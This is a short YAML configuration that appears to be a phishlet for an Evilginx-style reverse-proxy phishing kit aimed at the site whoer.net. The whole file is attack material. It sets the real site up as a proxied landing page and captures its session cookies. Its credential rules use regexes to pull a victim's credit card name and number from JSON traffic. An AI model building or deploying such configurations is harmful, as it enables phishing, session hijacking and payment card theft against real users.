min_ver: '3.0.0'
proxy_hosts:
  # 根域名（用于 cookie domain 替换）
  - {phish_sub: '', orig_sub: '', domain: 'whoer.net', session: false, is_landing: true, auto_filter: true}

sub_filters:

intercept:

js_inject:

auth_tokens:
  - domain: 'whoer.net'
    keys: []
    type: 'cookie'
credentials:
  username:
    key: ''
    search: '{"credit_card".*?"name":"([^"]*)"'
    type: 'json'
  password:
    key: ''
    search: '{"credit_card".*?"number":"([^"]*)"'
    type: 'json'

login:
  domain: 'whoer.net'
  path: '/'